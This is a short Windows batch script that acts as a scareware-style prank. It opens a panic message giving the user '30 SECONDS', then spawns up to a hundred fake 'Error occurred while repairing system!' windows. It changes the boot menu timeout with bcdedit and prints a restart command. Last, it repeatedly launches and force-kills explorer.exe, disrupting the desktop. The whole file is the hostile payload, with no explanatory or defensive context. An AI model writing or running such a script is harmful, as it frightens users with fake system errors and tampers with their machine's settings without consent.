@echo off
start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW! YOU ONLY HAVE 30 SECONDS! & echo( & pause"
for /L %%i in (1,1,100) do (
    start cmd /c "echo Error occurred while repairing system! & echo( & pause"
    timeout /t 7 >nul
)
bcdedit /timeout 1
echo shutdown -r -t 20
for /L %%i in (1,1,30) do (
    start explorer.exe
    timeout /t 2 >nul
    taskkill /im explorer.exe /f
)
